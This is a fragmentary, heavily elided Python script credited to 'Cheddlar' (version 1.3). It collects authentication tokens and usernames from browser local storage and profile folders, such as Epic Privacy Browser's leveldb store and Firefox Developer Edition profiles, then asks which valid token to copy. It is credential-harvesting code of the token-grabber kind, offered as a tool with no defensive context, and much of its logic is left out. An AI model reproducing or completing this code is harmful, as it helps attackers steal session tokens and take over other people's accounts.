...
print("=" * 40)
print("Made by Cheddlar || Version: 1.3")
print()
print()
...
def fetch_tokens_and_usernames():
     ...
     paths = {
          ...
          'Epic Privacy Browser': os.path.join(os.getenv("APPDATA"), 'Epic Privacy Browser', 'User Data', 'Local Storage', 'leveldb'),
          ...
          'Firefox Developer Edition': os.path.join(os.getenv("APPDATA"), 'Mozilla', 'Firefox Developer Edition', 'Profiles'),
     ...
     if valid_tokens:
          while True:
                choice = input("Enter the number of the token you wish to copy: ")
                try:
